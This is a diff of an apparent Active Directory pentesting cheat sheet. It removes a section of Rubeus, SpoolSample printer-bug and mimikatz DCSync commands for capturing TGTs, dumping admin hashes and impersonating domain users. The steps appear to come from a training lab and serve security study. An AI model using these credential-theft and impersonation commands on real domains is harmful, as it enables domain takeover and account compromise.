@@ -182,69 +182,6 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
      # Instead of /spn, we can use /spns:listofspns.txt and try multiple SPN's
      ```
 
-## Kerberoasting Unconstrained Delegation
-* **Rubeus**
-  Monitor for New TGT's
-  ```powershell
-  .\Rubeus.exe monitor /interval:5 /nowrap
-  ```
-  Use the recieved ticket to access a resource
-  ```powershell
-  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt
-  ```
-  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS
-  ```powershell
-  .\Rubeus.exe renew /ticket:<ticket> /ptt
-  ```
-
-## The Printer Bug
-> There is a bug in the Print System Remote protocol that can force a computer to authenticate to any computer in the domain, thus allowing us to capture the machine TGT
-
-* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this**  
-
-### Execution
-  Note: 2 computers, sql01 & DC01
-  From SQL01:
-  ```powershell
-  .\Rubeus.exe monitor /interval:5 /nowrap
-  ```
-  Open another PS windowson SQL01
-  ```powershell
-  #Syntax
-  .\SpoolSample.exe <TargetServer> <CaptureServer>
-  # Example
-  .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
-  ```
-  Renew the captured TGT w/ Rubeus
-  ```powershell
-  .\Rubeus.exe renew /ticket:<ticket> /ptt
-  ```
-  If we manage to capture the tgt, we can perform a DCSync and pwn the domain
-
-  Example
-  Dumping an admin user w/ mimikatz
-  ```powershell
-  mimikatz.exe
-  mimikatz > lsadump::dcsync /user:<Admin Username>
-  ```
-  Rubeus to request a ticket as that admin user
-  ```powershell
-  .\Rubeus.exe asktgt /rc4:<NTLM hash> /user:<admin username> /ptt
-  ```
-  We can now use this ticket to impersonate the administrative user.
-
-## S4U2self for Non-Domain Controllers
-
-> Using the credentials above, if we don't need to do a DCSync, or if the target computer is not a DC, we can use S4U2self to impersonate any user in the domain. This is useful for scenarios where we have a ticket from a computer that is not a domain controller
-
-  Forge a service ticket for any service
-  ```powershell
-  .\Rubeus.exe s4u /self /nowrap /impersonateuser:<User to impersonate> /altservice:<SPN> /ptt /ticker:<ticket>
-  ```
-
-## Unconstrained Delegation - Users
-
-
 **Mitigations**:
 
 * Have a very long password for your accounts with SPNs (> 32 characters)
